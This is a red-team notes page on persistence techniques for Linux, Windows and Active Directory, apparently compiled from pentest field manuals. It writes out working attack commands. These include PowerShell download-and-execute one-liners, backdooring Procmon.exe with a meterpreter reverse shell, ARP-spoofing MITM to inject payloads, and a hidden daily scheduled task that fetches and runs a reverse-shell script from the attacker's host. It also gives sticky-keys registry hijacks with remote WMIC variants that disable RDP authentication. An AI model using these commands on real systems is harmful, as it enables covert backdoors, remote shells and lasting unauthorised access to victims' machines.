# Persistence

## Guides and Reference

* [AlphasecLabs Persistence Guide](https://github.com/alphaSeclab/persistence/blob/master/Readme\_en.md)
* [PayloadsAllTheThings/Linux-Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md)
* [PayloadsAllTheThings/Windows-Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md)
* [https://www.ired.team/offensive-security/persistence](https://www.ired.team/offensive-security/persistence)
* [https://www.blackhillsinfosec.com/backdoors-breaches-logon-scripts/](https://www.blackhillsinfosec.com/backdoors-breaches-logon-scripts/)
* [https://offlinemark.com/2021/05/12/an-obscure-quirk-of-proc/](https://offlinemark.com/2021/05/12/an-obscure-quirk-of-proc/)
* Code Caves
  * [https://haiderm.com/fully-undetectable-backdooring-pe-file/#Code\_Caves](https://haiderm.com/fully-undetectable-backdooring-pe-file/#Code\_Caves)
* [https://www.infosecmatter.com/terminal-escape-injection/](https://www.infosecmatter.com/terminal-escape-injection/)
* [http://pwnwiki.io/#!persistence/windows/autostart.md](http://pwnwiki.io/#!persistence/windows/autostart.md) - Windows Autostart locations
* Common Registry locations for Persistence - _PTFM: - pg. 24_&#x20;
* _PTFM:  Persistence with Metasploit/Empire - pg. 26_

## Tools

### [BackDoorFactory](https://github.com/secretsquirrel/the-backdoor-factory)&#x20;

The goal of BDF is to patch executable binaries with user desired shellcode and continue normal execution of the pre-patched state.

* We can find the most commonly used binaries by searching open shares
  * We start with a command shell on the victim
  * Next we find all the shares on the network the user has access to.
    * \>Powershell.exe “IEX (New-Object Net.WebClient).DownloadString('https://raw/githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1'); Invoke-ShareFinder -ExcludeIPC -ExcludePrint -CheckShareAccess | Out-File -Encoding ascii found\_shares.txt”
  * Next we take the output from the shares and starts enumerating all the executables and finding the LastAccessTime and LastWriteTime
    * Powershell.exe “IEX (New-Object Net.WebClient).DownloadString('https://raw/githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1'); Invoke-FileFinder -ShareList .\found\_shares.txt -FreshEXEs -ExcludeHidden -CheckWriteAccess"
  * Now we grab a copy of the popular binary you choose. For the following example we will choose procmon.exe
    * \#cd /opt/the-backdoor-factory
    * ./backdoor.py -f \~/Desktop/Procmon.exe -s meterpreter\_reverse\_https -H \[your kali IP] -P 8080
  * Once you execute backdoor.py, now you need to find a code Cave to hold your shell code.
  * Once you find a cave that works, pres “a” to append your code. After this is complete, BDF will drop the new exe in the folder that was backdoored.
  * Now take that file and put it back on the fileshare.
* Setup - MITM
  * Run BDFProxy
    * \#bdfproxy
  * BDFProxy will create a metasploit resource file.
    * \#msfconsole -r /usr/share/bdfproxy/bdfproxy\_msf\_resource.rc
  * We alaso need to config our firewall to forward all http traffic through the mitmproxy
    * \#sysctl -w net.ipv4.ip\_forward=1
    * \#iptables -t nat -a PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
  * Lastly config the victim host to route through our machine using arpspoofing
    * \#arpspoof -i eth0 \[ip-vitim]\[ip gateway]
    * \#arpspoof -i eth0 \[ip gateway]\[ip-victim]

### Other Tools

* [Egress Buster](https://github.com/trustedsec/egressbuster) - EgressBuster is a way to test the effectiveness of egress filtering for an individual area.
* [Sharpersist](https://github.com/fireeye/sharpersist) - Windows persistence toolkit written in C#.
  * [https://github.com/fireeye/SharPersist/wiki](https://github.com/fireeye/SharPersist/wiki)
* [chromebackdoor](https://github.com/graniet/chromebackdoor) - Chromebackdoor is a PoC of pentest tool, this tool use a MITB technique for generate a windows executable ".exe" after launch run a malicious extension or script on most popular browsers, and send all DOM data on command and control.
* [cymothoa](https://www.kali.org/tools/cymothoa/) - Cymothoa is a stealth backdooring tool, that inject backdoor’s shellcode into an existing process. The tool uses the ptrace library (available on nearly all \* nix), to manipulate processes and infect them.
* [casper-fs](https://github.com/CoolerVoid/casper-fs) - Casper-fs is a custom Linux Kernel Module generator to work with resources to protect or hide a custom list of files. Each LKM has resources to protect or hide files following a custom list in the YAML rule file. Yes, not even the root has permission to see the files or make actions like edit and remove. The files only can be caught, edited, and deleted if the user sends a proper key to the custom device to liberate the action in the file system.

## **Linux**&#x20;

### Services  &#x20;

* Create a functional Bash init script at /etc/init.d/service
* Next run  #sudo update-rc.d service enable
* This will create a symlink in the runlevel directories 2-5
*   Next add the following respawn command in /etc/inittab

    &#x20;→ id:2345:respawn:/bin/sh /path/to/application/startup
*   Finally start and stop the service

    &#x20;→ #sudo service service stop

    &#x20;→ #sudo service service start
* _PTFM: .Service Persistence - pg. 88_

### systemd

* Defacto initialization daemon for linux distros
* Backward compatible with System V commands and initialization scripts
* Make sure the service has a functional systemd init script @ /etc/systemd/system/multi-user.target.wants/service.service
* Start the service     # sudo systemctl enable service.service
* Add “Restart=always” under the \[Service] section of the file /etc/
* systemd/system/multi-user.target.wants/service.service

### Cron

* Can be used by users without root access to schedule tasks
* [https://blog.sucuri.net/2019/05/cronjob-backdoors.html](https://blog.sucuri.net/2019/05/cronjob-backdoors.html)
* _PTFM: Cron Job Persistence - pg. 88_

### Init Files

* Upon login, all Bourne-compatible shells source /etc/profile, which in turn sources any readable \*.sh files in /etc/profile.d/
* These scripts do not require an interprester nor do they need to be executable.

### Graphical environments

*   Gnome and KDE graphical start code

    • Rootkits

### .bashrc and .bash\_profile

* _PTFM: .bashrc and .bash\_profile Persistence - pg. 87_

### PHP Web Shell

* _PTFM: Web Shell Persistence - pg. 87_

## Windows

* [http://pwnwiki.io/#!persistence/windows/general.md](http://pwnwiki.io/#!persistence/windows/general.md) - General Windows Persistence Commands

### Scheduled tasks persistence

* _RTFM: Task Scheduler Persistence - pg. 32_
* _PTFM:  Task Scheduler - pg. 25_
* We can use Metasploit to configure a schtask to run once a day to connect back to our meterpreter handler
* First we grab and modify a copy of invoke-shellcode.
  * \#cd /opt/PowerSploit/CodeExecution
  * \#cp Invoke-Shellcode.ps1 1.ps1
* Next we edit the script to add our shell info
  * Add the following line when filling in the listener IP and port
  * \# invoke-Shellcode -Payload windows/meterpreter/reverse\_https -Lhost \[LISTENER IP] -Lport \[Listener-port] -Force;
* Now we have a shortened invoke-shellcode script and can move the file off to a web server
  * \#cp 1.ps1/var/www/
  * \#service apache2 start
* Verify by visiting htt\[://\[your ip]/1.ps1
* Now we add a command to schtasks that downloads and runs the target script everyday
  * \#schtasks /create /tn \[Fake (service name] /tr “c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -NoLogo -WindowStyle hidden -Noninteractive -ep bypass -nop -c ‘IEX ((new-object net.webclient).downloadstring(’ ‘http://\[Your IP]/1.ps1’ ‘ ’))' " /SC DAILY /ST 12:00:00
* Options
  * If you have system privileges you can run this under SYSTEM. Add “/ru System” to the above command
  * If you are attacking a 32 bit system, change the powershell location in schtask to “c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe”

### Sticky Keys persistence

* Take advantage of the sticky key functionality to replace the sticket key exe with a shell
* Done by changing registry settings
  * \>REG ADD “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe” /V Debugger /t REG\_SZ /d “C:\windows\system32\cmd.exe”
  * \>REG ADD “HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp” /v UserAuthentication /t REG\_DWORD /d 0
  * \>REG ADD “HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp” /v SecurityLayer /t REG\_DWORD /d 0
* Might also need to add
  * \>netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
  * \>REG ADD “HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer” /v fDenyTSConnections /t REG\_DWORD /d 0 /f
* Performing the above via WMIC
  * \>wmic /user:\[username] /password:\[password] /node:\[server] process call create “C:\Windows\system32\reg.exe ADD “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe” /v Debugger /t REG\_SZ /d \ “C:\windows\system32\cmd.exe\” /f”
  * \>wmic /user:\[username] /password:\[password] /node:\[server] process call create “C:\Windows\system32\reg.exe ADD “HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp\” /v UserAuthentication /t REG\_DWORD /d 0 /f"
  * \>wmic /user:\[username] /password:\[password] /node:\[server] process call create “C:\Windows\system32\reg.exe REG ADD “HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp\” /v SecurityLayer /t REG\_DWORD /d 0 /f"
* If using kerberos, we can replace the username and password with /authority:"Kerberos:\[Domain]\\\[Server]"

### Windows Accessibility features

* One common, low-skill method of achieving persistence is replacing the Windows accessibility features’ binary files with their own malicious binary or simply a renamed copy of Windows ‘cmd.exe’.
* When a user tries to use the accessibility features, for example sticky keys, they will execute the ‘sethc.exe’ binary, which the attacker may have replaced with 'cmd.exe'. The result is that the user will be presented with a Windows command prompt.
* Due to the Windows accessibility features being available from the lock screen of desktops and servers, they can be triggered without any credentials; and due to no user being logged into the machine, Windows has no concept of who should be triggering the binary. As such, the malicious binary will run under the context of the SYSTEM account. Desktops and servers which have RDP enabled increase the risk of an attacker being able to remotely trigger the persistence mechanism.
* The binaries for the accessibility features can be found in C:\Windows\System32\\
  * `sethc.exe – Sticky Keys`\
    &#x20;`◇ Magnify.exe – Magnifier`\
    &#x20;`◇ toolosk.exe – On-Screen Keyboard`\
    &#x20;`◇ Narrator.exe – Narrator`\
    &#x20;`◇ DisplaySwitch.exe – Display Switcher`\
    &#x20;`◇ AtBroker.exe – App Switcher`
* The Image File Execution Option (IFEO) function allows for adding a debugging key into the registry, which causes the debugging binary to be executed when the target is launched.
  * `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<Target binary>`
  * This registry entry then adds string values (REG\_SZ) called ‘Debugger’, with a value which contains the path and binary name, i.e ‘C:\Users\Administrator\Malware.exe’

### Registry Injection

* A clever way malicious actors can gain persistence on target machines by exploiting legitimate features of Windows OS
* Inject your stager in what ever form you choose (usually exe) into the target registry location
* _PTFM:  Registry Injection - pg. 25_

Image File Execution Options Injection - IFEO

* Image File Execution Options (IFEO) registry key is a Windows feature commonly used by developers to attach a debugger to their application.
* IFEOs can be directly set via the registry or through GlobalFlags (gflags.exe), an app which is part of the Windows 10 SDK.
  * `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
* IFEOs can also enable a monitor program to be launched on silent exit of another program (is terminated early by itself or a second, non kernel-mode process).
  * `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit`
* A user can execute any binary file after another application is closed, or execute any binary as a debugger whenever another application is opened. This means that if a malicious actor is able to gain access to a target machine, they can abuse these values to obtain persistence and privilege escalation by planting a malicious executable to be loaded and run whenever a specified program (i.e. notepad.exe) opens/closes.
* The .exe you inject will need to be specifically compiled as a windows service if hiding this way, or the OS will kill it
* Another way is to have your stager drop a DLL instead of an EXE and reference it from a Registry key using rundll32
  * \>RUNDLL32.exe dllnameentrypoint
* It is possible to store and run Javascript in the Registry

### DLL Search Order Hijacking

* [DLLHijackingScanner](https://github.com/SecuProject/DLLHijackingScanner) - This is a PoC for bypassing UAC using DLL hijacking and abusing the "Trusted Directories" verification.
  * [https://securityonline.info/dllhijackingscanner-bypassing-uac-using-dll-hijacking/](https://securityonline.info/dllhijackingscanner-bypassing-uac-using-dll-hijacking/)
* [Rattler](https://github.com/sensepost/rattler) - Rattler is a tool that automates the identification of DLL's which can be used for DLL preloading attacks.
  * [https://sensepost.com/blog/2016/rattleridentifying-and-exploiting-dll-preloading-vulnerabilities/](https://sensepost.com/blog/2016/rattleridentifying-and-exploiting-dll-preloading-vulnerabilities/)
* [DLLHijackTest](https://github.com/slyd0g/DLLHijackTest) - DLL and PowerShell script to assist with finding DLL hijacks
* [Robber](https://github.com/MojtabaTajik/Robber) - Robber is open source tool for finding executables prone to DLL hijacking
  * [https://hakin9.org/robber-is-open-source-tool-for-finding-executables-prone-to-dll-hijacking/](https://hakin9.org/robber-is-open-source-tool-for-finding-executables-prone-to-dll-hijacking/)
* [https://www.blackhillsinfosec.com/digging-deeper-vulnerable-windows-services/](https://www.blackhillsinfosec.com/digging-deeper-vulnerable-windows-services/)
* [https://attack.mitre.org/techniques/T1574/001/](https://attack.mitre.org/techniques/T1574/001/)
* DLL Search Order Hijacking - _PTFM:  - pg. 25_

### Application Shimming

* [https://liberty-shell.com/sec/2020/02/25/shim-persistence/](https://liberty-shell.com/sec/2020/02/25/shim-persistence/)
* [https://docs.microsoft.com/en-us/windows-hardware/get-started/adk-install](https://docs.microsoft.com/en-us/windows-hardware/get-started/adk-install)

## **AD Persistence**

### Golden Ticket

* [Golden Ticket](https://pentestlab.blog/2018/04/09/golden-ticket/)
* [Kerberos Golden Tickets are Now More Golden](https://adsecurity.org/?p=1640)

### SID History

* [Sneaky Active Directory Persistence #14: SID History](https://adsecurity.org/?p=1772)

### Silver Ticket

* [How Attackers Use Kerberos Silver Tickets to Exploit Systems](https://adsecurity.org/?p=2011)
* [Sneaky Active Directory Persistence #16: Computer Accounts & Domain Controller Silver Tickets](https://adsecurity.org/?p=2753)

### DCShadow

* [Creating Persistence With Dcshadow](https://blog.stealthbits.com/creating-persistence-with-dcshadow/)

### AdminSDHolder

* [Sneaky Active Directory Persistence #15: Leverage AdminSDHolder & SDProp to (Re)Gain Domain Admin Rights](https://adsecurity.org/?p=1906)
* [Persistence Using Adminsdholder And Sdprop](https://blog.stealthbits.com/persistence-using-adminsdholder-and-sdprop/)

### Group Policy Object

* [Sneaky Active Directory Persistence #17: Group Policy](https://adsecurity.org/?p=2716)

### Skeleton Keys

* [Unlocking All The Doors To Active Directory With The Skeleton Key Attack](https://blog.stealthbits.com/unlocking-all-the-doors-to-active-directory-with-the-skeleton-key-attack/)
* [Skeleton Key](https://pentestlab.blog/2018/04/10/skeleton-key/)
* [Attackers Can Now Use Mimikatz to Implant Skeleton Key on Domain Controllers & BackDoor Your Active Directory Forest](https://adsecurity.org/?p=1275)

### SeEnableDelegationPrivilege

* [The Most Dangerous User Right You (Probably) Have Never Heard Of](https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/)
* [SeEnableDelegationPrivilege Active Directory Backdoor](https://www.youtube.com/watch?v=OiqaO9RHskU)

### Security Support Provider

* [Sneaky Active Directory Persistence #12: Malicious Security Support Provider (SSP)](https://adsecurity.org/?p=1760)

### Directory Services Restore Mode

* [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
* [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)

### ACLs & Security Descriptors

* [An ACE Up the Sleeve: Designing Active Directory DACL Backdoors](https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf)
* [Shadow Admins – The Stealthy Accounts That You Should Fear The Most](https://www.cyberark.com/threat-research-blog/shadow-admins-stealthy-accounts-fear/)
* [The Unintended Risks of Trusting Active Directory](https://www.slideshare.net/harmj0y/the-unintended-risks-of-trusting-active-directory)
* [HarmJ0y/DAMP](https://github.com/HarmJ0y/DAMP) - The Discretionary ACL Modification Project: Persistence Through Host-based Security Descriptor Modification
